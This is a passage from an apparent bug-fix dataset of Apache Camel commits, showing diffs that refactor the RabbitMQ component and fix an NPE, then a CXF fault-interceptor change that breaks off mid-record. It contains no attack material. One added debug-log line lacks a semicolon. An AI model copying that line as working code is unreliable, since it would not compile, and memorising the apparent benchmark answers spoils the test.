<artifactId>slf4j-log4j12</artifactId>\n+      <scope>test</scope>\n+    </dependency>\n+  </dependencies>\n+\n+  <build>\n+    <plugins>\n+      <plugin>\n+        <artifactId>maven-surefire-plugin</artifactId>\n+        <configuration>\n+          <excludes>\n+            <exclude>**/*IntTest*</exclude>\n+          </excludes>\n+        </configuration>\n+      </plugin>\n+    </plugins>\n+  </build>\n+\n+  <profiles>\n+    <profile>\n+      <id>itest</id>\n+      <build>\n+        <plugins>\n+          <plugin>\n+            <artifactId>maven-surefire-plugin</artifactId>\n+            <configuration>\n+              <excludes>\n+                <exclude>None</exclude>\n+              </excludes>\n+              <includes>\n+                <include>**/*IntTest*</include>\n+              </includes>\n+            </configuration>\n+          </plugin>\n+        </plugins>\n+      </build>\n+    </profile>\n+  </profiles>\n \n </project>",
                "raw_url": "https://github.com/apache/camel/raw/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/pom.xml",
                "sha": "d3dd4931991a99d1f69218b4314bf7d70221ce8c",
                "status": "modified"
            },
            {
                "additions": 21,
                "blob_url": "https://github.com/apache/camel/blob/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQComponent.java",
                "changes": 23,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQComponent.java?ref=423d2e8f26eb1bd7c69900aaa603b897c55c144a",
                "deletions": 2,
                "filename": "components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQComponent.java",
                "patch": "@@ -14,16 +14,20 @@\n  * See the License for the specific language governing permissions and\n  * limitations under the License.\n  */\n-\n package org.apache.camel.component.rabbitmq;\n \n+import java.net.URI;\n import java.util.Map;\n \n import org.apache.camel.CamelContext;\n import org.apache.camel.impl.DefaultComponent;\n+import org.slf4j.Logger;\n+import org.slf4j.LoggerFactory;\n \n public class RabbitMQComponent extends DefaultComponent {\n \n+    private static final transient Logger LOG = LoggerFactory.getLogger(RabbitMQComponent.class);\n+\n     public RabbitMQComponent() {\n     }\n \n@@ -35,8 +39,23 @@ public RabbitMQComponent(CamelContext context) {\n     protected RabbitMQEndpoint createEndpoint(String uri,\n                                               String remaining,\n                                               Map<String, Object> params) throws Exception {\n-        RabbitMQEndpoint endpoint = new RabbitMQEndpoint(uri, remaining, this);\n+        URI host = new URI(\"http://\" + remaining);\n+        String hostname = host.getHost();\n+        int portNumber = host.getPort();\n+        String exchangeName = host.getPath().substring(1);\n+\n+        RabbitMQEndpoint endpoint = new RabbitMQEndpoint(uri, this);\n+        endpoint.setHostname(hostname);\n+        endpoint.setPortNumber(portNumber);\n+        endpoint.setExchangeName(exchangeName);\n+\n         setProperties(endpoint, params);\n+\n+        if (LOG.isDebugEnabled()) {\n+            LOG.debug(\"Creating RabbitMQEndpoint with host {}:{} and exchangeName: {}\",\n+                    endpoint.getHostname(), endpoint.getPortNumber(), endpoint.getExchangeName())\n+        }\n+\n         return endpoint;\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQComponent.java",
                "sha": "03cf89669c21353df68f471e6fe7b224c199e9fc",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQConstants.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQConstants.java?ref=423d2e8f26eb1bd7c69900aaa603b897c55c144a",
                "deletions": 2,
                "filename": "components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQConstants.java",
                "patch": "@@ -14,10 +14,8 @@\n  * See the License for the specific language governing permissions and\n  * limitations under the License.\n  */\n-\n package org.apache.camel.component.rabbitmq;\n \n-\n public final class RabbitMQConstants {\n     \n     public static final String ROUTING_KEY = \"rabbitmq.ROUTING_KEY\";",
                "raw_url": "https://github.com/apache/camel/raw/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQConstants.java",
                "sha": "f57f561c13d144ab926f23970e2e5cf1900d3e27",
                "status": "modified"
            },
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQConsumer.java",
                "changes": 14,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQConsumer.java?ref=423d2e8f26eb1bd7c69900aaa603b897c55c144a",
                "deletions": 6,
                "filename": "components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQConsumer.java",
                "patch": "@@ -14,7 +14,6 @@\n  * See the License for the specific language governing permissions and\n  * limitations under the License.\n  */\n-\n package org.apache.camel.component.rabbitmq;\n \n import java.io.IOException;\n@@ -25,13 +24,10 @@\n import com.rabbitmq.client.Channel;\n import com.rabbitmq.client.Connection;\n import com.rabbitmq.client.Envelope;\n-\n-\n import org.apache.camel.Exchange;\n import org.apache.camel.Processor;\n import org.apache.camel.impl.DefaultConsumer;\n \n-\n public class RabbitMQConsumer extends DefaultConsumer {\n     \n     ExecutorService executor;\n@@ -86,7 +82,13 @@ protected void doStop() throws Exception {\n \n         channel = null;\n         conn = null;\n-        executor.shutdown();\n+        if (executor != null) {\n+            if (getEndpoint() != null && getEndpoint().getCamelContext() != null) {\n+                getEndpoint().getCamelContext().getExecutorServiceManager().shutdownNow(executor);\n+            } else {\n+                executor.shutdownNow();\n+            }\n+        }\n         executor = null;\n     }\n \n@@ -123,7 +125,7 @@ public void handleDelivery(String consumerTag,\n                 channel.basicAck(deliveryTag, false);\n \n             } catch (Exception e) {\n-                e.printStackTrace();\n+                getExceptionHandler().handleException(\"Error processing exchange\", exchange, e);\n             }\n         }\n     }",
                "raw_url": "https://github.com/apache/camel/raw/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQConsumer.java",
                "sha": "0927f8116fd94d0a06c23d2f9fe12698d3320040",
                "status": "modified"
            },
            {
                "additions": 85,
                "blob_url": "https://github.com/apache/camel/blob/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQEndpoint.java",
                "changes": 165,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQEndpoint.java?ref=423d2e8f26eb1bd7c69900aaa603b897c55c144a",
                "deletions": 80,
                "filename": "components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQEndpoint.java",
                "patch": "@@ -14,11 +14,9 @@\n  * See the License for the specific language governing permissions and\n  * limitations under the License.\n  */\n-\n package org.apache.camel.component.rabbitmq;\n \n import java.io.IOException;\n-import java.net.URI;\n import java.net.URISyntaxException;\n import java.util.UUID;\n import java.util.concurrent.ExecutorService;\n@@ -27,7 +25,6 @@\n import com.rabbitmq.client.Connection;\n import com.rabbitmq.client.ConnectionFactory;\n import com.rabbitmq.client.Envelope;\n-\n import org.apache.camel.Consumer;\n import org.apache.camel.Exchange;\n import org.apache.camel.Message;\n@@ -55,70 +52,10 @@\n     public RabbitMQEndpoint() {\n     }\n \n-    public RabbitMQEndpoint(String endpointUri,\n-                            String remaining,\n-                            RabbitMQComponent component) throws URISyntaxException {\n+    public RabbitMQEndpoint(String endpointUri, RabbitMQComponent component) throws URISyntaxException {\n         super(endpointUri, component);\n-\n-        URI uri = new URI(\"http://\" + remaining);\n-        hostname = uri.getHost();\n-        portNumber = uri.getPort();\n-        exchangeName = uri.getPath().substring(1);\n-    }\n-\n-\n-    public String getExchangeName() {\n-        return exchangeName;\n-    }\n-\n-    public void setQueue(String queue) {\n-        this.queue = queue;\n-    }\n-\n-    public int getThreadPoolSize() {\n-        return threadPoolSize;\n-    }\n-\n-    public void setThreadPoolSize(int threadPoolSize) {\n-        this.threadPoolSize = threadPoolSize;\n-    }\n-\n-    public boolean isAutoAck() {\n-        return autoAck;\n-    }\n-\n-    public void setAutoAck(boolean autoAck) {\n-        this.autoAck = autoAck;\n-    }\n-\n-    public String getQueue() {\n-        return queue;\n-    }\n-    \n-    public boolean isAutoDelete() {\n-        return autoDelete;\n     }\n \n-    public void setAutoDelete(boolean autoDelete) {\n-        this.autoDelete = autoDelete;\n-    }\n-\n-    public boolean isDurable() {\n-        return durable;\n-    }\n-\n-    public void setDurable(boolean durable) {\n-        this.durable = durable;\n-    }\n-\n-    public String getRoutingKey() {\n-        return routingKey;\n-    }\n-\n-    public void setRoutingKey(String routingKey) {\n-        this.routingKey = routingKey;\n-    }\n-    \n     public Exchange createRabbitExchange(Envelope envelope) {\n         Exchange exchange = new DefaultExchange(getCamelContext(), getExchangePattern());\n \n@@ -163,20 +100,12 @@ public boolean isSingleton() {\n         return true;\n     }\n \n-    public int getPortNumber() {\n-        return portNumber;\n-    }\n-\n-    public String getHostname() {\n-        return hostname;\n-    }\n-\n-    public String getVhost() {\n-        return vhost;\n-    }\n-\n-    public String getPassword() {\n-        return password;\n+    protected ExecutorService createExecutor() {\n+        if (getCamelContext() != null) {\n+            return getCamelContext().getExecutorServiceManager().newFixedThreadPool(this, \"RabbitMQConsumer\", getThreadPoolSize());\n+        } else {\n+            return Executors.newFixedThreadPool(getThreadPoolSize());\n+        }\n     }\n \n     public String getUsername() {\n@@ -187,15 +116,91 @@ public void setUsername(String username) {\n         this.username = username;\n     }\n \n+    public String getPassword() {\n+        return password;\n+    }\n+\n     public void setPassword(String password) {\n         this.password = password;\n     }\n \n+    public String getVhost() {\n+        return vhost;\n+    }\n+\n     public void setVhost(String vhost) {\n         this.vhost = vhost;\n     }\n \n-    public ExecutorService createExecutor() {\n-        return Executors.newFixedThreadPool(getThreadPoolSize());\n+    public String getHostname() {\n+        return hostname;\n+    }\n+\n+    public void setHostname(String hostname) {\n+        this.hostname = hostname;\n+    }\n+\n+    public int getThreadPoolSize() {\n+        return threadPoolSize;\n+    }\n+\n+    public void setThreadPoolSize(int threadPoolSize) {\n+        this.threadPoolSize = threadPoolSize;\n+    }\n+\n+    public int getPortNumber() {\n+        return portNumber;\n+    }\n+\n+    public void setPortNumber(int portNumber) {\n+        this.portNumber = portNumber;\n+    }\n+\n+    public boolean isAutoAck() {\n+        return autoAck;\n+    }\n+\n+    public void setAutoAck(boolean autoAck) {\n+        this.autoAck = autoAck;\n+    }\n+\n+    public boolean isAutoDelete() {\n+        return autoDelete;\n+    }\n+\n+    public void setAutoDelete(boolean autoDelete) {\n+        this.autoDelete = autoDelete;\n+    }\n+\n+    public boolean isDurable() {\n+        return durable;\n+    }\n+\n+    public void setDurable(boolean durable) {\n+        this.durable = durable;\n+    }\n+\n+    public String getQueue() {\n+        return queue;\n+    }\n+\n+    public void setQueue(String queue) {\n+        this.queue = queue;\n+    }\n+\n+    public String getExchangeName() {\n+        return exchangeName;\n+    }\n+\n+    public void setExchangeName(String exchangeName) {\n+        this.exchangeName = exchangeName;\n+    }\n+\n+    public String getRoutingKey() {\n+        return routingKey;\n+    }\n+\n+    public void setRoutingKey(String routingKey) {\n+        this.routingKey = routingKey;\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQEndpoint.java",
                "sha": "2a7e2d60d3168280c33fbb0468b70d260167d84d",
                "status": "modified"
            },
            {
                "additions": 16,
                "blob_url": "https://github.com/apache/camel/blob/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java",
                "changes": 26,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java?ref=423d2e8f26eb1bd7c69900aaa603b897c55c144a",
                "deletions": 10,
                "filename": "components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java",
                "patch": "@@ -14,7 +14,6 @@\n  * See the License for the specific language governing permissions and\n  * limitations under the License.\n  */\n-\n package org.apache.camel.component.rabbitmq;\n \n import java.io.IOException;\n@@ -24,10 +23,9 @@\n import com.rabbitmq.client.AMQP;\n import com.rabbitmq.client.Channel;\n import com.rabbitmq.client.Connection;\n-\n import org.apache.camel.Exchange;\n import org.apache.camel.impl.DefaultProducer;\n-\n+import org.apache.camel.util.ObjectHelper;\n \n public class RabbitMQProducer extends DefaultProducer {\n \n@@ -40,22 +38,30 @@ public RabbitMQProducer(RabbitMQEndpoint endpoint) throws IOException {\n         this.channel = conn.createChannel();\n     }\n \n+    @Override\n+    public RabbitMQEndpoint getEndpoint() {\n+        return (RabbitMQEndpoint) super.getEndpoint();\n+    }\n+\n     public void shutdown() throws IOException {\n         conn.close();\n     }\n \n     @Override\n     public void process(Exchange exchange) throws Exception {\n+        String exchangeName = exchange.getIn().getHeader(RabbitMQConstants.EXCHANGE_NAME, String.class);\n+        if (exchangeName == null) {\n+            exchangeName = getEndpoint().getExchangeName();\n+        }\n+        if (ObjectHelper.isEmpty(exchangeName)) {\n+            throw new IllegalArgumentException(\"ExchangeName is not provided in header \" + RabbitMQConstants.EXCHANGE_NAME);\n+        }\n \n-        Object key = exchange.getIn().getHeader(RabbitMQConstants.ROUTING_KEY);\n-        String exchangeName = exchange.getIn().getHeader(RabbitMQConstants.EXCHANGE_NAME).toString();\n-        byte[] messageBodyBytes = exchange.getIn().getBody(byte[].class);\n+        String key = exchange.getIn().getHeader(RabbitMQConstants.ROUTING_KEY, \"\", String.class);\n+        byte[] messageBodyBytes = exchange.getIn().getMandatoryBody(byte[].class);\n         AMQP.BasicProperties.Builder properties = buildProperties(exchange);\n \n-        channel.basicPublish(exchangeName,\n-                key == null ? \"\" : key.toString(),\n-                properties.build(),\n-                messageBodyBytes);\n+        channel.basicPublish(exchangeName, key, properties.build(), messageBodyBytes);\n     }\n \n     AMQP.BasicProperties.Builder buildProperties(Exchange exchange) {",
                "raw_url": "https://github.com/apache/camel/raw/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java",
                "sha": "1336de9018127d86c18222a3abadbe65c245eb48",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQComponentTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQComponentTest.java?ref=423d2e8f26eb1bd7c69900aaa603b897c55c144a",
                "deletions": 1,
                "filename": "components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQComponentTest.java",
                "patch": "@@ -50,7 +50,7 @@ public void testPropertiesSet() throws Exception {\n         assertEquals(\"queuey\", endpoint.getQueue());\n         assertEquals(\"vman\", endpoint.getVhost());\n         assertEquals(\"special.host\", endpoint.getHostname());\n-        assertEquals(14, endpoint.getPortNumber());\n+        assertEquals(14123, endpoint.getPortNumber());\n         assertEquals(515, endpoint.getThreadPoolSize());\n         assertEquals(true, endpoint.isAutoAck());\n     }",
                "raw_url": "https://github.com/apache/camel/raw/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQComponentTest.java",
                "sha": "244bc29ad0cdff38a00a30ca017697c492938cdc",
                "status": "modified"
            },
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQEndpointTest.java",
                "changes": 25,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQEndpointTest.java?ref=423d2e8f26eb1bd7c69900aaa603b897c55c144a",
                "deletions": 15,
                "filename": "components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQEndpointTest.java",
                "patch": "@@ -16,25 +16,22 @@\n  */\n package org.apache.camel.component.rabbitmq;\n \n-import java.net.URISyntaxException;\n import java.util.UUID;\n import java.util.concurrent.ThreadPoolExecutor;\n \n import com.rabbitmq.client.Envelope;\n-\n import org.apache.camel.Exchange;\n-import org.apache.camel.test.junit4.TestSupport;\n+import org.apache.camel.test.junit4.CamelTestSupport;\n import org.junit.Test;\n import org.mockito.Mockito;\n \n-public class RabbitMQEndpointTest extends TestSupport {\n+public class RabbitMQEndpointTest extends CamelTestSupport {\n \n     private Envelope envelope = Mockito.mock(Envelope.class);\n \n     @Test\n-    public void testCreatingRabbitExchangeSetsHeaders() throws URISyntaxException {\n-        RabbitMQEndpoint endpoint =\n-                new RabbitMQEndpoint(\"rabbitmq:localhost/exchange\", \"localhost/exchange\", new RabbitMQComponent());\n+    public void testCreatingRabbitExchangeSetsHeaders() throws Exception {\n+        RabbitMQEndpoint endpoint = context.getEndpoint(\"rabbitmq:localhost/exchange\", RabbitMQEndpoint.class);\n \n         String routingKey = UUID.randomUUID().toString();\n         String exchangeName = UUID.randomUUID().toString();\n@@ -52,19 +49,17 @@ public void testCreatingRabbitExchangeSetsHeaders() throws URISyntaxException {\n \n     @Test\n     public void creatingExecutorUsesThreadPoolSettings() throws Exception {\n-\n-        RabbitMQEndpoint endpoint =\n-                new RabbitMQEndpoint(\"rabbitmq:localhost/exchange\", \"localhost/exchange\", new RabbitMQComponent());\n-        endpoint.setThreadPoolSize(400);\n+        RabbitMQEndpoint endpoint = context.getEndpoint(\"rabbitmq:localhost/exchange?threadPoolSize=20\", RabbitMQEndpoint.class);\n+        assertEquals(20, endpoint.getThreadPoolSize());\n \n         ThreadPoolExecutor executor = assertIsInstanceOf(ThreadPoolExecutor.class,  endpoint.createExecutor());\n-        assertEquals(400, executor.getCorePoolSize());\n+        assertEquals(20, executor.getCorePoolSize());\n     }\n \n     @Test\n-    public void assertSingleton() throws URISyntaxException {\n-        RabbitMQEndpoint endpoint =\n-                new RabbitMQEndpoint(\"rabbitmq:localhost/exchange\", \"localhost/exchange\", new RabbitMQComponent());\n+    public void assertSingleton() throws Exception {\n+        RabbitMQEndpoint endpoint = context.getEndpoint(\"rabbitmq:localhost/exchange\", RabbitMQEndpoint.class);\n+\n         assertTrue(endpoint.isSingleton());\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQEndpointTest.java",
                "sha": "f66ab8518ebcd2d88b66665e7c7f8ff82ae53b11",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/test/resources/log4j.properties",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/test/resources/log4j.properties?ref=423d2e8f26eb1bd7c69900aaa603b897c55c144a",
                "deletions": 2,
                "filename": "components/camel-rabbitmq/src/test/resources/log4j.properties",
                "patch": "@@ -16,13 +16,13 @@\n ## ------------------------------------------------------------------------\n \n #\n-# The logging properties used for eclipse testing, We want to see debug output on the console.\n+# The logging properties used for testing.\n #\n log4j.rootLogger=INFO, file\n \n # uncomment the following to enable camel debugging\n #log4j.logger.org.apache.camel=DEBUG\n-#log4j.logger.org.apache.camel.component.quickfixj=DEBUG\n+#log4j.logger.org.apache.camel.component.rabbitmq=DEBUG\n \n # CONSOLE appender not used by default\n log4j.appender.out=org.apache.log4j.ConsoleAppender",
                "raw_url": "https://github.com/apache/camel/raw/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/src/test/resources/log4j.properties",
                "sha": "6e75a1bd850f49f925fa0c2ecc7cd8e19b836a5d",
                "status": "modified"
            }
        ],
        "message": "Fixed NPE in rabbitmq and polished the component.",
        "parent": "https://github.com/apache/camel/commit/82419d206c23c37882fa8786fe012c5b47240ddc",
        "patched_files": [
            "log4j.java",
            "RabbitMQComponent.java",
            "RabbitMQConstants.java",
            "RabbitMQConsumer.java",
            "RabbitMQProducer.java",
            "pom.java",
            "RabbitMQEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RabbitMQProducerTest.java",
            "RabbitMQComponentTest.java",
            "RabbitMQConsumerTest.java",
            "RabbitMQEndpointTest.java"
        ]
    },
    "camel_4559a6a": {
        "bug_id": "camel_4559a6a",
        "commit": "https://github.com/apache/camel/commit/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4",
        "file": [
            {
                "additions": 17,
                "blob_url": "https://github.com/apache/camel/blob/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/AbstractDataFormatFeature.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/AbstractDataFormatFeature.java?ref=4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4",
                "deletions": 0,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/AbstractDataFormatFeature.java",
                "patch": "@@ -17,12 +17,15 @@\n \n package org.apache.camel.component.cxf.feature;\n \n+import java.util.ArrayList;\n import java.util.Collection;\n import java.util.HashSet;\n import java.util.List;\n import java.util.Set;\n \n+import org.apache.cxf.endpoint.Client;\n import org.apache.cxf.feature.AbstractFeature;\n+import org.apache.cxf.interceptor.ClientFaultConverter;\n import org.apache.cxf.interceptor.Interceptor;\n import org.apache.cxf.message.Message;\n import org.apache.cxf.phase.PhaseInterceptor;\n@@ -32,11 +35,18 @@\n  * The abstract class for the data format feature\n  */\n public abstract class AbstractDataFormatFeature extends AbstractFeature {\n+    protected static final Collection<Class<?>> REMOVING_FAULT_IN_INTERCEPTORS;\n+    \n+    static {\n+        REMOVING_FAULT_IN_INTERCEPTORS = new ArrayList<Class<?>>();\n+        REMOVING_FAULT_IN_INTERCEPTORS.add(ClientFaultConverter.class);\n+    }\n \n     // The interceptors which need to be keeped\n     protected Set<String> inInterceptorNames = new HashSet<String>();\n     protected Set<String> outInterceptorNames = new HashSet<String>();\n     protected abstract Logger getLogger();\n+    \n \n     @Deprecated\n     // It will be removed in Camel 3.0\n@@ -116,6 +126,13 @@ protected void removeInterceptor(List<Interceptor<? extends Message>> intercepto\n         }        \n     }\n     \n+    protected void removeFaultInInterceptorFromClient(Client client) {\n+        removeInterceptors(client.getInFaultInterceptors(), REMOVING_FAULT_IN_INTERCEPTORS);\n+        removeInterceptors(client.getEndpoint().getService().getInFaultInterceptors(), REMOVING_FAULT_IN_INTERCEPTORS);\n+        removeInterceptors(client.getEndpoint().getInFaultInterceptors(), REMOVING_FAULT_IN_INTERCEPTORS);\n+        removeInterceptors(client.getEndpoint().getBinding().getInFaultInterceptors(), REMOVING_FAULT_IN_INTERCEPTORS);\n+    }\n+    \n     public void addInIntercepters(List<Interceptor<? extends Message>> interceptors) {\n         for (Interceptor<? extends Message> interceptor : interceptors) {\n             inInterceptorNames.add(interceptor.getClass().getName());",
                "raw_url": "https://github.com/apache/camel/raw/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/AbstractDataFormatFeature.java",
                "sha": "857b532b36ac5018a68d2c57c8aabb1c5a6ff0f8",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/CXFMessageDataFormatFeature.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/CXFMessageDataFormatFeature.java?ref=4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4",
                "deletions": 0,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/CXFMessageDataFormatFeature.java",
                "patch": "@@ -69,6 +69,7 @@\n \n     @Override\n     public void initialize(Client client, Bus bus) {\n+        removeFaultInInterceptorFromClient(client);\n         setupEndpoint(client.getEndpoint());\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/CXFMessageDataFormatFeature.java",
                "sha": "b585281ae31c1af926113292dbf513d9ef0fb69b",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/PayLoadDataFormatFeature.java",
                "changes": 11,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/PayLoadDataFormatFeature.java?ref=4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4",
                "deletions": 10,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/PayLoadDataFormatFeature.java",
                "patch": "@@ -44,11 +44,8 @@\n  */\n public class PayLoadDataFormatFeature extends AbstractDataFormatFeature {\n     private static final Logger LOG = LoggerFactory.getLogger(PayLoadDataFormatFeature.class);\n-    private static final Collection<Class<?>> REMOVING_FAULT_IN_INTERCEPTORS;\n     private static final boolean DEFAULT_ALLOW_STREAMING;\n     static {\n-        REMOVING_FAULT_IN_INTERCEPTORS = new ArrayList<Class<?>>();\n-        REMOVING_FAULT_IN_INTERCEPTORS.add(ClientFaultConverter.class);\n         \n         String s = System.getProperty(\"org.apache.camel.component.cxf.streaming\");\n         DEFAULT_ALLOW_STREAMING = s == null || Boolean.parseBoolean(s);\n@@ -167,11 +164,5 @@ protected void resetPartTypeClass(MessageInfo msgInfo) {\n             }\n         }\n     }\n-    private void removeFaultInInterceptorFromClient(Client client) {\n-        removeInterceptors(client.getInFaultInterceptors(), REMOVING_FAULT_IN_INTERCEPTORS);\n-        removeInterceptors(client.getEndpoint().getService().getInFaultInterceptors(), REMOVING_FAULT_IN_INTERCEPTORS);\n-        removeInterceptors(client.getEndpoint().getInFaultInterceptors(), REMOVING_FAULT_IN_INTERCEPTORS);\n-        removeInterceptors(client.getEndpoint().getBinding().getInFaultInterceptors(), REMOVING_FAULT_IN_INTERCEPTORS);\n-    }\n-\n+    \n }",
                "raw_url": "https://github.com/apache/camel/raw/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/feature/PayLoadDataFormatFeature.java",
                "sha": "e9efdd4198213d4a122ffb607931a92029ec1f27",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageRouterTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageRouterTest.java?ref=4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageRouterTest.java",
                "patch": "@@ -18,6 +18,7 @@\n \n import javax.xml.ws.Endpoint;\n \n+import org.apache.camel.builder.NoErrorHandlerBuilder;\n import org.apache.camel.builder.RouteBuilder;\n import org.apache.hello_world_soap_http.GreeterImpl;\n import org.junit.AfterClass;\n@@ -47,6 +48,7 @@ public static void startService() {\n     protected RouteBuilder createRouteBuilder() {\n         return new RouteBuilder() {\n             public void configure() {\n+                context.setErrorHandlerBuilder(new NoErrorHandlerBuilder());\n                 from(\"cxf:bean:routerEndpoint?dataFormat=CXF_MESSAGE&publishedEndpointUrl=http://www.simple.com/services/test\")\n                     .to(\"cxf:bean:serviceEndpoint?dataFormat=CXF_MESSAGE\");\n             }",
                "raw_url": "https://github.com/apache/camel/raw/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageRouterTest.java",
                "sha": "5368b3e85ac2b022bebdfe32cc4c72ec6aa4e113",
                "status": "modified"
            },
            {
                "additions": 50,
                "blob_url": "https://github.com/apache/camel/blob/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageWithoutSEIRouterTest.java",
                "changes": 50,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageWithoutSEIRouterTest.java?ref=4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4",
                "deletions": 0,
